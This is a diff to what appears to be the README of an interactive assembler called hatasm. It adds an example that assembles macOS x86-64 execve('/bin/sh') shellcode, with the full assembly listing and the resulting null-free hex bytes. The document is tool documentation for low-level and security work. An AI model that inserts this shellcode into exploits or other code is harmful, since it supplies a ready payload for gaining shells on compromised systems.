@@ -95,3 +95,25 @@ hatasm > start:
 00000000  48 31 c0 99 90                                   |H1...           |
 hatasm >
 ```
+
+Write macos execve /bin/sh shellcode from command-line.
+
+```
+hatasm > start:
+........     xor rax, rax
+........     cdq
+........     push rax
+........     mov rdi, 0x68732f6e69622f2f
+........     push rdi
+........     push rsp
+........     pop rdi
+........     xor rsi, rsi
+........     mov al, 0x2
+........     ror rax, 0x28
+........     mov al, 0x3b
+........     syscall
+........
+00000000  48 31 c0 99 50 48 bf 2f  2f 62 69 6e 2f 73 68 57 |H1..PH.//bin/shW|
+00000010  54 5f 48 31 f6 b0 02 48  c1 c8 28 b0 3b 0f 05    |T_H1...H..(.;.. |
+hatasm > 
+```
